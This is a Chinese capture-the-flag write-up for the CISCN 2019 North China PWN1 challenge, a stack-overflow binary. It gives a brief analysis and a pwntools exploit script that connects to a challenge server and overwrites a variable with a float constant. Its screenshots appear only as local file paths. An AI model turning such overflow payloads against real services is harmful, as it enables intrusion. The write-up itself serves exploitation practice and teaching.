# [CISCN 2019华北]PWN1

## 附件

![image-20220605163140329](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20220605163140329.png)

很简单的栈溢出，具体看看ida的伪代码

![image-20220605163040980](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20220605163040980.png)

![image-20220605163100842](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20220605163100842.png)

## 分析

考虑栈溢出，而且没有stack的保护，很简单很基础，将返回地址覆盖为我们指向的地址

## 脚本

```
from pwn import *
p = remote('1.14.71.254',28086)
#p=process("./c")
ret=0x0000000000400501 
add=0x41348000
sys=0x400530
payload=b'a'*(0x30+0x8)+p64(sys)
payload2=b'a'*(0x30-0x4)+p64(add)
p.sendline(payload2)
p.interactive()

```

这里之所以payload不行而payload2可以，很可能就是跳转到sys的plt地址，但是没有给binsh的参数，但是获取binsh的参数需要泄露libc，更加麻烦，这里是直接修改了值。

## 补充

在这里补充IEEE 754浮点数十六进制相互转换！！！

[IEEE 754浮点数十六进制](https://lostphp.com/hexconvert/)